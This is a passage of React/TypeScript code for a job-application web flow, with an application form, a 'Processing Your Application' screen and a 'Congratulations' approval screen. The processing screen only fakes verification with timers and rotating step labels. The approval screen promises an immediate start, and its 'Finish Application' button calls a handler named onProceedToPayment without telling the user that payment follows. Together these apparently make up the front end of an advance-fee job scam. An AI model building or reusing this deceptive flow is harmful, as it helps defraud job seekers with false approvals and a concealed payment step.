                className={`w-full py-2.5 sm:py-3 rounded-lg sm:rounded-xl font-bold text-sm sm:text-base text-white transition-all duration-300 transform hover:scale-105 shadow-lg bg-gradient-to-r ${
                  company.color === 'blue' ? 'from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700' :
                  company.color === 'orange' ? 'from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700' :
                  'from-green-500 to-green-600 hover:from-green-600 hover:to-green-700'
                }`}
              >
                Visit Blog
                <ArrowRight className="inline ml-1 sm:ml-2 h-4 w-4 sm:h-5 sm:w-5" />
              </button>
            </div>
          </div>
        ))}
      </div>

      {/* Back Button - Mobile Friendly */}
      <div className="text-center">
        <button
          onClick={onBack}
          className="px-6 sm:px-8 py-2.5 sm:py-3 rounded-lg sm:rounded-xl bg-gray-200 hover:bg-gray-300 text-gray-700 font-bold text-sm sm:text-base transition-all duration-300"
        >
          <ChevronLeft className="inline mr-1 sm:mr-2 h-4 w-4 sm:h-5 sm:w-5" />
          Back
        </button>
      </div>
    </div>
  );
};

// Company Application Form Component
const CompanyApplicationForm: React.FC<{
  company: any;
  position: string;
  applicantName: string;
  onSubmit: () => void;
  onBack: () => void;
}> = ({ company, position, applicantName, onSubmit, onBack }) => {
  const [agreed, setAgreed] = useState(false);

  return (
    <div className="w-full px-4 py-4 animate-fade-in">
      <div className="bg-white rounded-2xl sm:rounded-3xl shadow-xl sm:shadow-2xl p-4 sm:p-6 md:p-8 max-w-lg sm:max-w-xl md:max-w-2xl mx-auto">
        {/* Company Logo - Mobile Optimized */}
        <div className="flex justify-center mb-4 sm:mb-6">
          <img 
            src={company.logo} 
            alt={company.name}
            className="h-12 sm:h-14 md:h-16 object-contain"
          />
        </div>

        <h2 className="text-xl sm:text-2xl md:text-3xl font-bold text-center text-gray-800 mb-4 sm:mb-6 px-2">
          Application for {position} at {company.name}
        </h2>

        {/* Application Summary - Mobile Responsive */}
        <div className="bg-gradient-to-r from-blue-50 to-green-50 rounded-xl sm:rounded-2xl p-3 sm:p-4 md:p-6 mb-4 sm:mb-6">
          <h3 className="font-bold text-base sm:text-lg text-gray-800 mb-2 sm:mb-3">Application Summary</h3>
          <div className="space-y-1.5 sm:space-y-2">
            <div className="flex flex-col sm:flex-row sm:justify-between gap-0.5 sm:gap-2">
              <span className="text-xs sm:text-sm md:text-base text-gray-600">Applicant:</span>
              <span className="font-semibold text-xs sm:text-sm md:text-base text-gray-800">{applicantName}</span>
            </div>
            <div className="flex flex-col sm:flex-row sm:justify-between gap-0.5 sm:gap-2">
              <span className="text-xs sm:text-sm md:text-base text-gray-600">Position:</span>
              <span className="font-semibold text-xs sm:text-sm md:text-base text-gray-800">{position}</span>
            </div>
            <div className="flex flex-col sm:flex-row sm:justify-between gap-0.5 sm:gap-2">
              <span className="text-xs sm:text-sm md:text-base text-gray-600">Company:</span>
              <span className="font-semibold text-xs sm:text-sm md:text-base text-gray-800">{company.name}</span>
            </div>
            <div className="flex flex-col sm:flex-row sm:justify-between gap-0.5 sm:gap-2">
              <span className="text-xs sm:text-sm md:text-base text-gray-600">Available Slots:</span>
              <span className="font-semibold text-xs sm:text-sm md:text-base text-green-600">{company.positions} positions</span>
            </div>
          </div>
        </div>

        {/* Terms Agreement - Mobile Optimized */}
        <div className="bg-yellow-50 border-2 border-yellow-200 rounded-lg sm:rounded-xl p-3 sm:p-4 mb-4 sm:mb-6">
          <label className="flex items-start cursor-pointer">
            <input
              type="checkbox"
              checked={agreed}
              onChange={(e) => setAgreed(e.target.checked)}
              className="mt-0.5 sm:mt-1 mr-2 sm:mr-3 h-4 w-4 sm:h-5 sm:w-5 text-green-600 rounded focus:ring-green-500 flex-shrink-0"
            />
            <span className="text-xs sm:text-sm text-gray-700">
              I confirm that all information provided in my initial application is accurate and I agree to the terms and conditions of {company.name}.
            </span>
          </label>
        </div>

        {/* Action Buttons - Mobile Responsive */}
        <div className="flex flex-col sm:flex-row gap-2 sm:gap-3 md:gap-4">
          <button
            onClick={onBack}
            className="w-full sm:flex-1 px-4 sm:px-5 md:px-6 py-2.5 sm:py-3 rounded-lg sm:rounded-xl bg-gray-200 hover:bg-gray-300 text-gray-700 font-bold text-sm sm:text-base transition-all duration-300"
          >
            <ChevronLeft className="inline mr-1 sm:mr-2 h-4 w-4 sm:h-5 sm:w-5" />
            Back
          </button>
          <button
            onClick={onSubmit}
            disabled={!agreed}
            className={`w-full sm:flex-1 px-4 sm:px-5 md:px-6 py-2.5 sm:py-3 rounded-lg sm:rounded-xl font-bold text-sm sm:text-base transition-all duration-300 transform ${
              agreed 
                ? 'bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white hover:scale-105 shadow-lg' 
                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
            }`}
          >
            Submit Application
            <CheckCircle className="inline ml-1 sm:ml-2 h-4 w-4 sm:h-5 sm:w-5" />
          </button>
        </div>
      </div>
    </div>
  );
};

// Processing Alternative Application Component
const ProcessingAlternativeApplication: React.FC<{ company: any }> = ({ company }) => {
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState(0);
  
  const steps = [
    'Verifying Information',
    'Checking Available Positions',
    'Matching Your Profile',
    'Finalizing Application'
  ];

  useEffect(() => {
    const progressInterval = setInterval(() => {
      setProgress(prev => Math.min(prev + 1, 100));
    }, 150);

    const stepInterval = setInterval(() => {
      setCurrentStep(prev => (prev + 1) % steps.length);
    }, 3750);

    return () => {
      clearInterval(progressInterval);
      clearInterval(stepInterval);
    };
  }, []);

  return (
    <div className="flex flex-col items-center justify-center animate-fade-in w-full px-4 py-4">
      <div className="bg-white rounded-2xl sm:rounded-3xl shadow-xl sm:shadow-2xl p-4 sm:p-6 md:p-8 w-full max-w-sm sm:max-w-md md:max-w-lg">
        {/* Company Logo - Mobile Optimized */}
        <div className="flex justify-center mb-4 sm:mb-6">
          <img 
            src={company.logo} 
            alt={company.name}
            className="h-12 sm:h-14 md:h-16 object-contain animate-pulse"
          />
        </div>

        <h2 className="text-lg sm:text-xl md:text-2xl font-bold text-center text-gray-800 mb-4 sm:mb-6">
          Processing Your Application
        </h2>

        {/* Current Step - Mobile Friendly */}
        <div className="text-center mb-4 sm:mb-6">
          <p className="text-sm sm:text-base md:text-lg font-semibold text-blue-600 animate-fade-in">
            {steps[currentStep]}
          </p>
        </div>

        {/* Progress Bar - Mobile Optimized */}
        <div className="mb-4 sm:mb-6">
          <div className="w-full bg-gray-200 rounded-full h-2 sm:h-3">
            <div 
              className="bg-gradient-to-r from-green-500 to-blue-600 h-2 sm:h-3 rounded-full transition-all duration-500"
              style={{ width: `${progress}%` }}
            ></div>
          </div>
          <p className="text-center text-xs sm:text-sm text-gray-600 mt-1.5 sm:mt-2">{progress}% Complete</p>
        </div>

        {/* Loading Animation - Mobile Sized */}
        <div className="flex justify-center">
          <div className="relative w-12 h-12 sm:w-14 sm:h-14 md:w-16 md:h-16">
            <div className="absolute inset-0 rounded-full border-3 sm:border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
            <div className="absolute inset-1.5 sm:inset-2 rounded-full border-3 sm:border-4 border-green-200 border-t-green-600 animate-spin-slow"></div>
          </div>
        </div>

        <p className="text-center text-xs sm:text-sm text-gray-600 mt-4 sm:mt-6">
          Please wait while we process your application...
        </p>
      </div>
    </div>
  );
};

// Alternative Application Approved Component
const AlternativeApplicationApproved: React.FC<{
  company: any;
  position: string;
  onProceedToPayment: () => void;
}> = ({ company, position, onProceedToPayment }) => {
  return (
    <div className="flex flex-col items-center justify-center animate-fade-in w-full px-4 py-4">
      <div className="bg-white rounded-2xl sm:rounded-3xl shadow-xl sm:shadow-2xl p-4 sm:p-6 md:p-8 w-full max-w-lg sm:max-w-xl md:max-w-2xl">
        {/* Success Animation - Mobile Sized */}
        <div className="flex justify-center mb-4 sm:mb-6">
          <div className="relative">
            <div className="absolute inset-0 bg-green-400 rounded-full blur-xl opacity-30 animate-pulse"></div>
            <CheckCircle className="h-16 w-16 sm:h-20 sm:w-20 md:h-24 md:w-24 text-green-500 relative z-10 animate-bounce" />
          </div>
        </div>

        {/* Congratulations Message - Responsive Text */}
        <h2 className="text-2xl sm:text-3xl md:text-4xl font-black text-center text-green-700 mb-3 sm:mb-4">
          Congratulations! 🎉
        </h2>
        
        <div className="text-center mb-4 sm:mb-6">
          <p className="text-base sm:text-lg md:text-xl font-bold text-gray-800 mb-1 sm:mb-2">
            Your application to {company.name} has been approved!
          </p>
          <p className="text-sm sm:text-base md:text-lg text-gray-600">
            You've been matched for the <span className="font-bold text-blue-600">{position}</span> position
          </p>
        </div>

        {/* Company Logo - Mobile Optimized */}
        <div className="flex justify-center mb-4 sm:mb-6">
          <img 
            src={company.logo} 
            alt={company.name}
            className="h-14 sm:h-16 md:h-20 object-contain"
          />
        </div>

        {/* Application Details - Mobile Responsive */}
        <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-xl sm:rounded-2xl p-3 sm:p-4 md:p-6 mb-4 sm:mb-6">
          <div className="grid grid-cols-2 gap-3 sm:gap-4">
            <div className="text-center">
              <p className="text-xl sm:text-2xl md:text-3xl font-black text-green-600">{company.positions}</p>
              <p className="text-xs sm:text-sm text-gray-600">Slots Remaining</p>
            </div>
            <div className="text-center">
              <p className="text-xl sm:text-2xl md:text-3xl font-black text-blue-600">Immediate</p>
              <p className="text-xs sm:text-sm text-gray-600">Start Date</p>
            </div>
          </div>
        </div>

        {/* Next Steps - Mobile Friendly */}
        <div className="bg-yellow-50 border-l-4 border-yellow-400 p-3 sm:p-4 mb-4 sm:mb-6">
          <p className="text-xs sm:text-sm text-gray-700">
            <strong>Next Steps:</strong> Click "Finish Application" to complete your application. You will receive further communication about your interview schedule and required documents via SMS and email.
          </p>
        </div>

        {/* Proceed Button - Mobile Optimized */}
        <button
          onClick={onProceedToPayment}
          className="w-full py-3 sm:py-3.5 md:py-4 rounded-lg sm:rounded-xl bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-sm sm:text-base md:text-lg transition-all duration-300 transform hover:scale-105 shadow-lg"
        >
          Finish Application
          <ArrowRight className="inline ml-1 sm:ml-2 h-4 w-4 sm:h-5 sm:w-5" />
        </button>
      </div>
    </div>
  );
};

export default ApplicationPage;


